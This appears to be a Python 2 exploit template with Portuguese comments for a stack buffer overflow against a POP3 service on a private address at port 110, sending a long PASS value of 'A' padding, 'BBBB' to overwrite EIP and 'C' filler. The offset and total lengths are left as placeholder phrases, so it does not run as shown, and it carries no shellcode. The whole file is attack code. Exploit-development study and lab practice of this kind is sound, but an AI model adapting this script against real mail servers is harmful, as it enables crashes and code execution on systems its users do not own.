#!/usr/bin/python
import socket
bytes = "A" * valor pra chegar no EIP + "BBBB" + "C" * (valor total - valor pra chegar no EIP e EIP)
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.2.140",110))
	r = s.recv(1024)
	print r

	s.send("USER usuario\r\n")
	r = s.recv(1024)
	print r

	s.send("PASS "+bytes+"\r\n") #observe o +bytes+ aqui
	r = s.recv(1024)
	print r

	s.send("QUIT\r\n")
	r = s.recv(1024)
	print r
except:
	print "Erro ao conectar"